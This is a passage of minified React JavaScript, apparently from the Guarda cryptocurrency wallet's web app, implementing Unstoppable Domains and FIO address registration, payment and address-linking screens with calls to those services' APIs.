                    isInvalid: !a && c,
                    message: n
                }, O.createElement(Mh, {
                    withoutSubwallets: !0,
                    wallets: g[e],
                    onChange: handleChangeWallet(e),
                    selectedWallet: d[e],
                    customFilter: e => onCustomFilterWallets(e, _z),
                    udListOfCurrencies: _z.join(", ")
                }))
            }
            )))))))), O.createElement("div", {
                className: dM
            }), O.createElement("div", {
                className: fM
            }, O.createElement("div", {
                className: EM
            }, "Step 2 of 3"), O.createElement("div", {
                className: hM
            }, "update" !== e.type && O.createElement("span", {
                onClick: handleBack
            }, "Back"), O.createElement(Yl, {
                onClick: handleConfirm,
                color: "blue",
                size: "big"
            }, "Link"))))))
        }
        const wz = "payment_wrapper_il1Ai app_wrapperBlock_2EpA3"
          , bz = "payment_wrapperForm_198v_ app_wrapperLeftBlock_3QLZp"
          , kz = "payment_footerBlock_1Pswk app_footerBlock_n86Kc"
          , Sz = "payment_stepInfo_1uVTe app_stepInfo_2VLE6"
          , Cz = "payment_toggleAdvancedOptions_1VPsi"
          , Nz = "payment_price_1lh7Y"
          , Tz = "payment_cruxPlaceholder_rUs4P"
          , Az = "payment_loading_yzHa4"
          , xz = "payment_loaderWrapper_-TUdo"
          , Iz = "payment_wrapperButtons_2l8Ri";
        let Pz = !1;
        const Lz = {
            bch: "bitcoincash",
            ltc: "litecoin",
            btc: "bitcoin",
            eth: "ethereum",
            usdc: "usdc",
            dai: "dai"
        };
        function UdPaymentIndex() {
            var e;
            const t = (0,
            $.I0)()
              , a = (0,
            $.v9)($c)
              , n = (0,
            $.v9)(eu)
              , r = O.createRef()
              , l = a.filter((e => "eth" === e.currency && !e.isWatchOnly && !e.isHw))
              , s = useLocationSearch()
              , i = (0,
            j.k6)()
              , o = (0,
            j.TH)()
              , [c,u] = (0,
            O.useState)(!1)
              , [d,m] = (0,
            O.useState)(n(s.wallet))
              , [p,f] = (0,
            O.useState)(null)
              , [E,h] = (0,
            O.useState)(!1)
              , [g,y] = (0,
            O.useState)(null)
              , [v,_] = (0,
            O.useState)(null)
              , [w,b] = (0,
            O.useState)(null)
              , [k,S] = (0,
            O.useState)(null)
              , [C,N] = (0,
            O.useState)("");
            let T = null == w || null === (e = w.pricing[Lz[null == d ? void 0 : d.currency]]) || void 0 === e ? void 0 : e.amount;
            null != p && p.test && "eth" === (null == d ? void 0 : d.currency) && (T = "0.0001");
            const [A] = fee_wallet(d)
              , [x] = use_fee(d, d, T)
              , setProcess = async e => {
                y(e);
                return new Promise((e => setTimeout(e, 200)))
            }
            ;
            (0,
            O.useEffect)(( () => {
                if (v) {
                    Pz = !1;
                    setProcess(null);
                    h(!1)
                }
            }
            ), [v]);
            (0,
            O.useEffect)(( () => {
                g && !E && h(!0);
                if (!g) {
                    Pz = !1;
                    h(!1)
                }
            }
            ), [g]);
            (0,
            O.useEffect)(( () => {
                c && u(!1)
            }
            ), [d]);
            (0,
            O.useEffect)(( () => {
                setProcess("Creating order...");
                async function createOrder() {
                    try {
                        const {data: e} = await Jf().post(`https://unstoppabledomains.com/api/v1/resellers/guarda/users/${s.email}/orders`, {
                            order: {
                                domains: [{
                                    name: `${s.domainName}.crypto`,
                                    owner: {
                                        address: n(s.wallet).address
                                    },
                                    resolution: {
                                        crypto: Object.keys(s.wallets).reduce(( (e, t) => {
                                            e[t.toUpperCase()] = {
                                                address: n(s.wallets[t]).address
                                            };
                                            return e
                                        }
                                        ), {})
                                    }
                                }],
                                payment: {
                                    type: "coinbase"
                                }
                            }
                        })
                          , {data: t} = await Jf().get(`https://api.commerce.coinbase.com/charges/${e.order.payment.tokenId}`);
                        setProcess(null);
                        N(e.order.payment.tokenId);
                        b(t.data);
                        S(e.order.orderNumber)
                    } catch (e) {
                        setProcess(null)
                    }
                }
                !w && a.length && createOrder()
            }
            ), [a]);
            (0,
            O.useEffect)(( () => {
                async function fetchSettings() {
                    const {data: e} = await Jf().get(`https://unstoppabledomains.com/api/v1/resellers/guarda/domains/${s.domainName}.crypto`);
                    f(e.domain.reselling)
                }
                fetchSettings()
            }
            ), []);
            async function handleNext() {
                if (Pz)
                    return;
                if (!x && 0 !== x)
                    return;
                if (!w)
                    return;
                u(!1);
                await setProcess("Fetch order parameters...");
                const e = {
                    address: w.addresses[Lz[null == d ? void 0 : d.currency]],
                    currency: d.currency
                };
                await setProcess("Loading blockchain adapter...");
                const a = await tM.send("send", d, e, A, {
                    amount: T,
                    isFeeIncluded: !1,
                    fee: x
                });
                if (a.error)
                    _(a.error);
                else if (a.hash) {
                    t(setSecureData(Je, {
                        orderNumber: k,
                        tokenId: C,
                        owner: n(s.wallet).address,
                        privateKey: n(s.wallet).privateKey,
                        email: s.email,
                        domainName: `${s.domainName}.crypto`
                    }));
                    t(handleDownload(Sm.FORCE));
                    cc.$.send(cc.d.UD_REGISTER_SUCCESS, s.domainName);
                    i.replace({
                        pathname: (0,
                        M.RU)("/send/success"),
                        search: objectToString({
                            type: "udPaymentComplete",
                            hash: a.hash,
                            walletFrom: d.uuid,
                            currency: d.currency,
                            domain: `${s.domainName}.crypto`
                        })
                    })
                } else
                    _(!0)
            }
            function handleChangeUdWallet(e) {
                m(e)
            }
            const [I] = usePrecision(d)
              , P = {
                precision: I >= 0 ? I : null,
                min: (0,
                Ko.FH)((0,
                Ko.PD)(T, x).toString(), {
                    max: I
                }),
                available: null == d ? void 0 : d.balance
            }
              , handleBack = () => {
                i.replace({
                    pathname: (0,
                    M.RU)("/ud/select-wallets"),
                    search: o.search
                })
            }
            ;
            return O.createElement("div", {
                className: wz
            }, O.createElement(DashboardMenu, null), O.createElement(XO, null, O.createElement(panel_right_image, {
                src: VU,
                style: {
                    width: "90%"
                }
            }, "Manage your human-readable address")), O.createElement("div", {
                className: bz
            }, O.createElement(sf(), {
                ref: r
            }, O.createElement(label, null, "Payment"), O.createElement("p", null, "You pay an equivalent of ", (null == p ? void 0 : p.price) || "...", " USD to register an address. The domain is paid for only during its registration. In the future, you only need pay a network fee when you changing the address mapping.", O.createElement("br", null), O.createElement("br", null), "Choose wallet to pay for the domain.", O.createElement("br", null), O.createElement("br", null)), O.createElement(label, null, "Wallet"), O.createElement(lf.ValidatorField, {
                rules: [...zf.wallet, ...zf.amount(P)],
                value: d
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isSelect: !0,
                    isInvalid: !t && c,
                    message: a
                }, O.createElement(Mh, {
                    withoutSubwallets: !0,
                    wallets: l,
                    customFilter: e => Object.keys(Lz).includes(e.currency),
                    onChange: handleChangeUdWallet,
                    selectedWallet: d
                }))
            }
            )), d && w && O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Amount to transfer:"), O.createElement(MiskInfoValue, null, (0,
            Ko.yF)(T), " ", (0,
            be.xG)(d.currency))), d && O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Network fee:"), O.createElement(MiskInfoValue, null, x || "—", " ", (0,
            be.xG)(d.currency))), O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Your domain:"), O.createElement(MiskInfoValue, null, s.domainName, ".crypto")), (null == p ? void 0 : p.test) && O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "TEST:"), O.createElement(MiskInfoValue, null, "true")), v && O.createElement(bf, {
                error: v
            }), O.createElement("div", {
                className: kz
            }, E && O.createElement("div", {
                className: xz
            }, g && O.createElement("span", null, g)), !E && O.createElement("div", {
                className: Sz
            }, "Step 2 of 3"), O.createElement("div", {
                className: Iz
            }, !E && O.createElement("span", {
                onClick: handleBack
            }, "Back"), O.createElement(Yl, {
                onClick: handleNext,
                color: "blue",
                size: "big",
                id: "udConfirm"
            }, "Confirm"))))))
        }
        const Fz = "view-wallets_emptyState_3QoQH"
          , Wz = "view-wallets_walletElement_2kbgg"
          , Rz = "view-wallets_walletWrapper_2WbZO"
          , Bz = "view-wallets_loadingOverlay_21ee0"
          , Oz = "view-wallets_wrapperButtons_1WbSA"
          , Dz = "view-wallets_copy_1dstd"
          , Mz = "view-wallets_address_V_Cq3"
          , view_wallets_BoardSendConfirm = () => {
            const e = (0,
            $.I0)()
              , t = (0,
            $.v9)($c)
              , [a,n] = (0,
            O.useState)(!1)
              , [r,l] = (0,
            O.useState)(!1)
              , [s] = (0,
            O.useState)({})
              , [i,o] = (0,
            O.useState)([])
              , [c,u] = (0,
            O.useState)(null)
              , [d] = (0,
            O.useState)({});
            (0,
            O.useEffect)(( () => {
                r && l(!1)
            }
            ), [d, s]);
            (0,
            O.useEffect)(( () => {
                async function fetchAddresses() {
                    const t = await e(getSecureData(Je));
                    if (!t)
                        return;
                    n(!0);
                    const {data: a} = await Jf().get(`https://unstoppabledomains.com/api/v1/${t.domainName}`);
                    u(t.domainName);
                    n(!1);
                    const r = Object.keys(a.addresses).reduce(( (e, t) => {
                        e.push({
                            currency: t,
                            address: a.addresses[t]
                        });
                        return e
                    }
                    ), []);
                    o(r)
                }
                fetchAddresses()
            }
            ), [t]);
            return O.createElement("div", {
                className: sM
            }, O.createElement(DashboardMenu, null), O.createElement(XO, null, O.createElement(panel_right_image, {
                src: VU
            }, "Manage your human-readable address")), O.createElement("div", {
                className: iM
            }, O.createElement(label, null, c, ". Linked addresses"), O.createElement("p", null, "You can change the binding in your", " ", O.createElement("a", {
                href: "https://unstoppabledomains.com/domains",
                target: "_blank",
                rel: "noreferrer noopener"
            }, "Unstoppable Domain Account ", O.createElement("img", {
                src: Bp,
                alt: ""
            }))), O.createElement("div", {
                className: "relative"
            }, a && O.createElement("div", {
                className: Bz
            }, O.createElement(LoaderDots, {
                visible: !0
            })), 0 === i.length && O.createElement("div", {
                className: Fz
            }, O.createElement("p", null, "You need wallets to proceed")), O.createElement("div", {
                className: dM
            }), i.map((e => O.createElement(O.Fragment, {
                key: `item-select${e.currency}`
            }, O.createElement("div", {
                className: Wz
            }, O.createElement(label, null, (0,
            be.xG)(e.currency), ":", " ", O.createElement(button_copy, {
                className: Dz,
                text: e.address
            }, "copy")), O.createElement("span", {
                className: Mz
            }, e.address))))))))
        }
          , Uz = (0,
        j.EN)(view_wallets_BoardSendConfirm)
          , Gz = "select-wallets_emptyState_3MDXa"
          , Vz = "select-wallets_walletElement_C4Y6O"
          , Kz = "select-wallets_walletWrapper_30GAI"
          , Hz = "select-wallets_loadingOverlay_3kdSq";
        let zz = !1;
        function fio_select_wallets_BoardSendConfirm() {
            const e = useLocationSearch()
              , t = O.createRef()
              , a = (0,
            $.I0)()
              , n = (0,
            j.k6)()
              , r = (0,
            $.v9)(eu)
              , l = (0,
            $.v9)($c)
              , [s,i] = (0,
            O.useState)(!1)
              , [o,c] = (0,
            O.useState)(!1)
              , [u,d] = (0,
            O.useState)(null)
              , [m,p] = (0,
            O.useState)(null)
              , [f,E] = (0,
            O.useState)(!1)
              , [h,g] = (0,
            O.useState)({})
              , [y,v] = (0,
            O.useState)({})
              , [_,w] = (0,
            O.useState)(!1)
              , [b,k] = (0,
            O.useState)(null)
              , S = basic_memo_wallet(r(e.fioWallet))
              , C = undefined
              , N = (0,
            $.v9)(Po)(e.fioWalletName)
              , T = (0,
            $.v9)(Bo)
              , [A] = use_fee(null != b ? b : void 0, null != b ? b : void 0, void 0, {
                type: "add_pub_address"
            })
              , setProcess = async e => {
                d(e);
                return new Promise((e => setTimeout(e, 200)))
            }
            ;
            (0,
            O.useEffect)(( () => {
                k(S)
            }
            ), [S]);
            (0,
            O.useEffect)(( () => {
                f && E(!1)
            }
            ), [y, h]);
            const x = l.reduce(( (e, t) => {
                var a, n;
                if (t.currency.toLowerCase().includes("testnet"))
                    return e;
                if ("fio" === t.currency.toLowerCase())
                    return e;
                if (t.currency.toLowerCase().includes("ropsten"))
                    return e;
                if (!e[null !== (a = (0,
                be.rX)(t.currency)) && void 0 !== a ? a : "undefined"]) {
                    var r;
                    e[null !== (r = (0,
                    be.rX)(t.currency)) && void 0 !== r ? r : "undefined"] = []
                }
                e[null !== (n = (0,
                be.rX)(t.currency)) && void 0 !== n ? n : "undefined"].push(t);
                return e
            }
            ), {});
            (0,
            O.useEffect)(( () => {
                if (!0 !== T && "update" === e.type && b) {
                    c(!0);
                    a(fetchFIOAttachedWallets(b, e.fioWalletName)).then(( () => {
                        c(!1)
                    }
                    ))
                }
            }
            ), [b, T]);
            (0,
            O.useEffect)(( () => {
                "update" === e.type && 0 !== l.length && Object.keys(N).length > 0 && setInitialWallets();
                function findWalletByAddressCurrency(e, t) {
                    return l.find((a => a.address === e && (0,
                    be.rX)(a.currency) === t))
                }
                async function setInitialWallets() {
                    c(!0);
                    const e = Object.keys(N);
                    if (e.length) {
                        e.forEach((e => {
                            const t = undefined
                              , a = findWalletByAddressCurrency(N[e], e);
                            if (a) {
                                var n, r;
                                h[null !== (n = (0,
                                be.rX)(e)) && void 0 !== n ? n : "undefined"] = a;
                                y[null !== (r = (0,
                                be.rX)(e)) && void 0 !== r ? r : "undefined"] = !0
                            }
                        }
                        ));
                        Object.keys(x).forEach((e => {
                            h[e] || (h[e] = x[e][0])
                        }
                        ));
                        g({
                            ...h
                        });
                        v({
                            ...y
                        });
                        c(!1)
                    } else
                        c(!1)
                }
            }
            ), [N]);
            (0,
            O.useEffect)(( () => {
                if (m) {
                    zz = !1;
                    setProcess(null);
                    i(!1)
                }
            }
            ), [m]);
            function chunkArray(e, t) {
                const a = e.length
                  , n = [];
                for (let r = 0; r < a; r += t) {
                    const a = e.slice(r, r + t);
                    n.push(a)
                }
                return n
            }
            (0,
            O.useEffect)(( () => {
                u && !s && i(!0);
                if (!u) {
                    zz = !1;
                    i(!1)
                }
            }
            ), [u]);
            function getAddressesChunks() {
                const e = Object.values(h).flatMap((e => {
                    var t;
                    return y[null !== (t = (0,
                    be.rX)(e.currency)) && void 0 !== t ? t : "undefined"] ? [{
                        currency: (0,
                        be.rX)(e.currency),
                        address: e.address
                    }] : []
                }
                )).filter((e => {
                    var t;
                    if (!N)
                        return !1;
                    const a = N[null !== (t = (0,
                    be.rX)(null == e ? void 0 : e.currency)) && void 0 !== t ? t : "undefined"];
                    return !a || a !== (null == e ? void 0 : e.address)
                }
                ));
                return chunkArray(e, 5)
            }
            const handleConfirm = async () => {
                var a, r;
                if (zz)
                    return;
                if (o)
                    return;
                const {isValid: l} = null !== (a = null === (r = t.current) || void 0 === r ? void 0 : r.validate()) && void 0 !== a ? a : {};
                if (!l) {
                    E(!0);
                    return
                }
                zz = !0;
                p(null);
                await setProcess("Loading FIO Blockchain adapter...");
                const s = await Se.Z.getApiByCurrency("fio");
                await setProcess("Preparing transaction...");
                try {
                    await setProcess("Linking addresses");
                    const t = getAddressesChunks();
                    for (const e of t)
                        await new Promise((t => {
                            setTimeout((async () => {
                                t(await s.addPublicAddresses({
                                    addressArray: e,
                                    privateKey: null == b ? void 0 : b.privateKey,
                                    address: null == b ? void 0 : b.address
                                }))
                            }
                            ), 500)
                        }
                        ));
                    n.push({
                        pathname: (0,
                        M.RU)("/send/success"),
                        search: objectToString({
                            type: "fioUpdate",
                            accountName: e.fioWalletName
                        })
                    });
                    zz = !1
                } catch (e) {
                    p(!0)
                }
            }
              , I = Object.keys(x)
              , P = Object.values(y).filter(Boolean)
              , L = I.length === P.length && P.length > 0;
            (0,
            O.useEffect)(( () => {
                if (!_ && l.length && Object.keys(x).length && "update" !== e.type) {
                    I.forEach((e => {
                        const t = x[e][0];
                        if (t) {
                            y[e] = !0;
                            h[e] = t
                        }
                    }
                    ));
                    g({
                        ...h
                    });
                    v({
                        ...y
                    });
                    w(!0)
                }
            }
            ), [l]);
            function handleSelectAll() {
                const e = !L;
                I.forEach((t => {
                    y[t] = e
                }
                ));
                v({
                    ...y
                })
            }
            function handleChangeWallet(e) {
                return function onChangeWallet(t) {
                    h[e] = t;
                    g({
                        ...h
                    });
                    y[e] = !0;
                    v({
                        ...y
                    })
                }
            }
            function handleCheckedCurrency(e) {
                return function onChangeWallet() {
                    y[e] = !y[e];
                    v({
                        ...y
                    });
                    if (!h[e]) {
                        h[e] = x[e][0];
                        g({
                            ...h
                        })
                    }
                }
            }
            const localValidatorWallet = e => [{
                rule: t => !e || !!t,
                message: "No wallet selected"
            }];
            function getCalculatedFee() {
                const e = getAddressesChunks();
                return (0,
                Ko.$q)(A, e.length)
            }
            return O.createElement("div", {
                className: sM
            }, O.createElement(DashboardMenu, null), O.createElement(XO, null, O.createElement(panel_right_image, {
                src: VU
            }, "Manage your human-readable address")), O.createElement("div", {
                className: iM
            }, O.createElement(sf(), {
                ref: t
            }, O.createElement(label, null, "What is FIO?"), O.createElement("p", null, "You can only link one address from a particular blockchain to your FIO address. However, you can easily modify the addresses linked to your FIO address."), O.createElement(label, null, "Link addresses to your FIO address"), O.createElement("div", {
                className: "relative"
            }, o && O.createElement("div", {
                className: Hz
            }, O.createElement(LoaderDots, {
                visible: !0
            })), b && O.createElement(mE, {
                value: e.fioWalletName,
                wallet: b,
                disabled: !0
            }), O.createElement(mp, {
                onChange: handleSelectAll,
                checked: L
            }, "Select all"), O.createElement("div", {
                className: dM
            }), 0 === l.length && O.createElement("div", {
                className: Gz
            }, O.createElement("p", null, "You need wallets to proceed")), Object.keys(x).map((e => O.createElement(O.Fragment, {
                key: `item-select${e}`
            }, O.createElement("div", {
                className: Vz
            }, O.createElement(mp, {
                onChange: handleCheckedCurrency(e),
                checked: y[e] || !1
            }, (0,
            be.xG)(e)), O.createElement("div", {
                className: Kz
            }, O.createElement(lf.ValidatorField, {
                rules: localValidatorWallet(y[e]),
                value: h[e]
            }, (t => {
                let {isValid: a, message: n} = t;
                return O.createElement(pa, {
                    isSelect: !0,
                    isInvalid: !a && f,
                    message: n
                }, O.createElement(Mh, {
                    withoutSubwallets: !0,
                    wallets: x[e],
                    onChange: handleChangeWallet(e),
                    selectedWallet: h[e],
                    customFilter: t => onCustomFilterWallets(t, [e]),
                    emptyPlaceholder: `You can select only ${e.toUpperCase()} here`
                }))
            }
            )))))))), O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "FIO Fee:"), O.createElement(MiskInfoValue, {
                disabled: !A
            }, (0,
            Ko.yF)(getCalculatedFee()), " ", (0,
            be.xG)(null == b ? void 0 : b.currency))), !!m && O.createElement(ui_message, {
                type: "error"
            }, "Failed to link addresses"), O.createElement("div", {
                className: dM
            }), O.createElement("div", {
                className: fM
            }, s && O.createElement("div", {
                className: yM
            }, u && O.createElement("span", null, u)), s || "update" === e.type ? O.createElement("div", {
                className: EM
            }) : O.createElement("div", {
                className: EM
            }, "Step 3 of 4"), O.createElement("div", {
                className: hM
            }, O.createElement(Yl, {
                onClick: handleConfirm,
                color: "blue",
                size: "big",
                isLoading: s
            }, "Link"))))))
        }
        const jz = "register-address_wrapper_206iA app_wrapperBlock_2EpA3"
          , $z = "register-address_wrapperForm_2T04h app_wrapperLeftBlock_3QLZp"
          , Zz = "register-address_footerBlock_ykkuV app_footerBlock_n86Kc"
          , Yz = "register-address_stepInfo_21oHe app_stepInfo_2VLE6"
          , qz = "register-address_toggleAdvancedOptions_30O0i"
          , Xz = "register-address_cruxPlaceholder_1NliM"
          , Qz = "register-address_loading_amzhD"
          , Jz = "register-address_loaderWrapper_3Ysme";
        let ej, tj = !1;
        const aj = "guardawallet";
        function register_address_FioRegisterAddress() {
            const e = (0,
            $.I0)()
              , t = (0,
            j.TH)()
              , a = stringToObject(t.search)
              , n = O.createRef()
              , r = (0,
            $.v9)($c)
              , [l,s] = (0,
            O.useState)(!1)
              , [i,o] = (0,
            O.useState)(!1)
              , [c,u] = (0,
            O.useState)(!1)
              , [d,m] = (0,
            O.useState)(null)
              , [p,f] = (0,
            O.useState)(null)
              , [E,h] = (0,
            O.useState)(!0)
              , [g] = (0,
            O.useState)("")
              , [y,v] = (0,
            O.useState)(null)
              , [_,w] = (0,
            O.useState)()
              , [b,k] = (0,
            O.useState)([]);
            (0,
            O.useEffect)(( () => {
                const e = r.filter((e => "fio" === e.currency));
                k(e)
            }
            ), [r]);
            (0,
            O.useEffect)(( () => {
                if (!_ && b.length > 0)
                    if (a.wallet) {
                        const e = b.find((e => e.uuid === a.wallet));
                        w(e)
                    } else
                        w(b[0])
            }
            ), [b]);
            const setProcess = async e => {
                m(e);
                return new Promise((e => setTimeout(e, 200)))
            }
              , createFioWallet = async () => {
                const t = _e.ZP.getClass({
                    currency: "fio"
                })
                  , a = await (new t).create({
                    currency: "fio"
                });
                e(rd.addWallet({
                    wallet: a,
                    options: {
                        downloadType: Sm.AFTER_CREATE_WALLET
                    }
                }));
                return a
            }
            ;
            (0,
            O.useEffect)(( () => {
                if (p) {
                    tj = !1;
                    setProcess(null);
                    u(!1)
                }
            }
            ), [p]);
            (0,
            O.useEffect)(( () => {
                d && !c && u(!0);
                if (!d) {
                    tj = !1;
                    u(!1)
                }
            }
            ), [d]);
            (0,
            O.useEffect)(( () => {
                l && s(!1)
            }
            ), [g]);
            (0,
            O.useEffect)(( () => {
                async function fetchFioAdapter() {
                    try {
                        const e = await Se.Z.getApiByCurrency("fio");
                        v(e)
                    } catch (e) {
                        f("Failed to fetch adapter")
                    }
                }
                fetchFioAdapter()
            }
            ), []);
            async function validateAccountName() {
                if (y)
                    if (g) {
                        o(!0);
                        try {
                            const {status: e} = await y.isNameAvailable({
                                name: `${g}@${aj}`
                            });
                            h(e)
                        } catch (e) {
                            h(!1)
                        }
                        o(!1)
                    } else
                        o(!1)
            }
            (0,
            O.useEffect)(( () => {
                window.clearTimeout(ej);
                E || o(!0);
                ej = window.setTimeout(validateAccountName, 500)
            }
            ), [g]);
            async function handleNext() {
                var e, t, a;
                if (tj)
                    return;
                const {isValid: r} = null !== (e = null === (t = n.current) || void 0 === t ? void 0 : t.validate()) && void 0 !== e ? e : {
                    isValid: !1
                };
                if (!r) {
                    s(!0);
                    return
                }
                let l = _;
                _ || 0 !== b.length || (l = await createFioWallet());
                const i = `https://reg.fioprotocol.io/ref/guardafree?publicKey=${null === (a = l) || void 0 === a ? void 0 : a.address}`;
                window.open(i, "_blank")
            }
            return O.createElement("div", {
                className: jz
            }, O.createElement(DashboardMenu, null), O.createElement(XO, null, O.createElement(panel_right_image, {
                src: VU,
                style: {
                    width: "90%"
                }
            }, "Manage your human-readable address")), O.createElement("div", {
                className: $z
            }, O.createElement(sf(), {
                ref: n
            }, O.createElement(label, null, "What is a FIO address?"), O.createElement("p", null, "FIO Address is a human-readable identifier that eliminates the need to see blockchain public addresses.", O.createElement("br", null), O.createElement("br", null), "Registration of a FIO Address also allows you to send and receive encrypted payment requests.", O.createElement("br", null), O.createElement("br", null), "Read more about FIO in our ", O.createElement("a", {
                href: "https://support.guarda.com/assets/what-is-fio-protocol",
                target: "_blank",
                rel: "noreferrer noopener"
            }, "Support Center ", O.createElement("img", {
                src: Bp,
                alt: ""
            })), O.createElement("br", null), O.createElement("br", null)), O.createElement(O.Fragment, null, b.length > 0 && O.createElement("div", null, O.createElement(label, null, "Your FIO wallet"), O.createElement(lf.ValidatorField, {
                rules: zf.wallet,
                value: _
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isSelect: !0,
                    isInvalid: !t && l,
                    message: a
                }, O.createElement(Mh, {
                    updateBalanceOnChange: !0,
                    fioWallets: !0,
                    selectedWallet: _,
                    wallets: b,
                    onChange: w,
                    customFilter: e => onCustomFilterWallets(e, ["fio"])
                }))
            }
            ))), O.createElement(lf.ValidatorField, {
                rules: zf.bool,
                value: !i
            })), !!p && O.createElement(ui_message, {
                type: "error"
            }, "Failed to create FIO Address."), O.createElement(ui_message, null, "FIO Foundation welcomes new users with a limited address giveaway! Get your first FIO address"), O.createElement("div", {
                className: Zz
            }, c && O.createElement("div", {
                className: Jz
            }, d && O.createElement("span", null, d)), O.createElement("div", null), O.createElement(Yl, {
                onClick: handleNext,
                color: "blue",
                size: "big",
                isLoading: c,
                id: "getFreeFio"
            }, "Get free FIO address")))))
        }
        const nj = register_address_FioRegisterAddress
          , rj = "payment-address_wrapper_5mibe app_wrapperBlock_2EpA3"
          , lj = "payment-address_wrapperForm_177zD app_wrapperLeftBlock_3QLZp"
          , sj = "payment-address_footerBlock_1eCrt app_footerBlock_n86Kc"
          , ij = "payment-address_stepInfo_1R7Yd app_stepInfo_2VLE6"
          , oj = "payment-address_toggleAdvancedOptions_324Sj"
          , cj = "payment-address_disable_2OF2z"
          , uj = "payment-address_currencyName_1j4o0"
          , dj = "payment-address_listTicker_2Ca8g"
          , mj = "payment-address_notEnoughFundsLabel_1qd8d"
          , pj = "payment-address_cruxPlaceholder_30GLV"
          , fj = "payment-address_loading_KCy0Q"
          , Ej = "payment-address_loaderWrapper_253Ad"
          , hj = "payment-address_buttonsWrapper_1eFAb"
          , gj = "payment-address_info_1GScW"
          , yj = "payment-address_infoBlock_ZyH1U"
          , vj = "payment-address_bold_1jkbP"
          , _j = ["btc", "bch", "ltc", "eth"]
          , wj = "/api/v1/internal/proxy/https://reg.fioprotocol.io/public-api/buy-address"
          , bj = {
            bitcoin: "btc",
            bitcoincash: "bch",
            dai: "dai",
            usdc: "usdc",
            litecoin: "ltc",
            ethereum: "eth"
        }
          , kj = ["dai", "usdc"];
        let Sj = !1;
        function FioPaymentAddress() {
            const e = (0,
            $.I0)()
              , t = useLocationSearch()
              , {pubKey: a, accountName: n, domain: r} = t
              , l = O.createRef()
              , s = (0,
            $.v9)(eu)
              , [i,o] = (0,
            O.useState)(!1)
              , [c,u] = (0,
            O.useState)(!0)
              , [d,m] = (0,
            O.useState)(null)
              , [p,f] = (0,
            O.useState)(null)
              , [E,h] = (0,
            O.useState)([])
              , [g,y] = (0,
            O.useState)(null)
              , [v,_] = (0,
            O.useState)(null)
              , [w,b] = (0,
            O.useState)(null)
              , k = (0,
            j.k6)()
              , S = (0,
            j.TH)()
              , [C,N] = (0,
            O.useState)(null)
              , T = (0,
            $.v9)($c)
              , A = s(t.wallet)
              , [x] = fee_wallet(null != p ? p : void 0)
              , [I,P,L] = use_fee(null != p ? p : void 0, null != p ? p : void 0, g ? g.amount : 0, {
                totalBalance: null == p ? void 0 : p.balance
            });
            (0,
            O.useEffect)(( () => {
                if (P) {
                    N("Failed to fetch network fee");
                    Sj = !0
                }
            }
            ), [P]);
            function mapPricing(e) {
                const t = {};
                Object.keys(bj).forEach((a => {
                    e.pricing[a] && e.addresses[a] && (t[bj[a]] = {
                        amount: e.pricing[a].amount,
                        address: e.addresses[a]
                    })
                }
                ));
                return t
            }
            function hasEnoughWallet(e) {
                if (e.isNewWallet || e.isNewToken)
                    return !1;
                if (!d)
                    return !1;
                let t = null;
                Object.keys(d).forEach((a => {
                    a === e.currency && (t = d[a].amount)
                }
                ));
                return !!t && !(0,
                Ko.G)(e.balance, t)
            }
            (0,
            O.useEffect)(( () => {
                Sj = !1;
                async function loadBuyInfo() {
                    try {
                        const {data: e} = await Jf().post(wj, {
                            address: `${n}@${r}`,
                            referralCode: "guarda",
                            publicKey: a,
                            redirectUrl: "https://guarda.co"
                        })
                          , {charge: t} = e.success;
                        m(mapPricing(t));
                        b(e.success.charge.extern_id);
                        u(!1)
                    } catch (e) {
                        u(!1);
                        N("Failed to fetch payment information");
                        Sj = !0
                    }
                }
                loadBuyInfo()
            }
            ), []);
            (0,
            O.useEffect)(( () => {
                if (!T || !Array.isArray(T) || 0 === T.length)
                    return;
                const e = [...T].filter((e => _j.includes(e.currency))).map((e => {
                    if (!e.subWallets || 0 === e.subWallets.length)
                        return e;
                    e.subWallets = e.subWallets.filter((e => kj.includes(e.currency)));
                    return e
                }
                ));
                h(e)
            }
            ), [T]);
            (0,
            O.useEffect)(( () => {
                if (E && 0 !== E.length && d && !p) {
                    const e = E.find((e => hasEnoughWallet(e)));
                    f(e || E[0])
                }
            }
            ), [E, d]);
            (0,
            O.useEffect)(( () => {
                if (!p || !d)
                    return;
                let e = null;
                Object.keys(d).forEach((t => {
                    if (t === p.currency) {
                        e = d[t];
                        e.currency = t
                    }
                }
                ));
                e && y(e)
            }
            ), [p, d]);
            function checkEnoughFee() {
                if (!p || !g || !I || L)
                    return !1;
                if ((null == x ? void 0 : x.uuid) === p.uuid) {
                    if ((0,
                    Ko.lt)(p.balance, (0,
                    Ko.PD)(g.amount, I))) {
                        N("Not enough funds to pay network fee ");
                        return !1
                    }
                } else if ((0,
                Ko.lt)(null == x ? void 0 : x.balance, I)) {
                    N("Not enough funds to pay network fee ");
                    return !1
                }
                return !0
            }
            async function handleNext() {
                var t, a;
                if (Sj)
                    return;
                if (C)
                    return;
                if (L)
                    return;
                if (!d)
                    return;
                if (!p)
                    return;
                if (!g)
                    return;
                if (!x)
                    return;
                if (!checkEnoughFee())
                    return;
                const {isValid: s} = null !== (t = null === (a = l.current) || void 0 === a ? void 0 : a.validate()) && void 0 !== t ? t : {};
                if (!s) {
                    o(!0);
                    return
                }
                Sj = !0;
                u(!0);
                _("Updating wallet balance...");
                await e(updateWalletsBalanceAndTxs(p, {
                    isCascade: !0
                }));
                _(`Loading ${(0,
                be.xG)(p.currency)} Blockchain adapter...`);
                _("Preparing transaction...");
                const i = await tM.send("fio-pay-address", p, g, x, {
                    amount: g.amount,
                    isFeeIncluded: !1,
                    fee: I
                });
                if (i.error) {
                    N(i.error);
                    Sj = !1;
                    u(!1)
                } else {
                    FioLogger.info({
                        fromFioAddress: `${n}@${r}`,
                        extraData: {
                            hash: i.hash,
                            amount: g.amount,
                            currency: p.currency,
                            addressFrom: p.address,
                            addressTo: g.address
                        }
                    }, rB);
                    e(setPendingAccount(`${n}@${r}`, n, r, A, w));
                    k.push({
                        pathname: (0,
                        M.RU)("/send/success"),
                        search: objectToString({
                            type: "fioPaymentSuccess",
                            fioWalletName: `${n}@${r}`
                        })
                    })
                }
            }
            function handleSelectPayWallet(e) {
                f(e);
                N("");
                Sj = !1
            }
            const handleBack = () => {
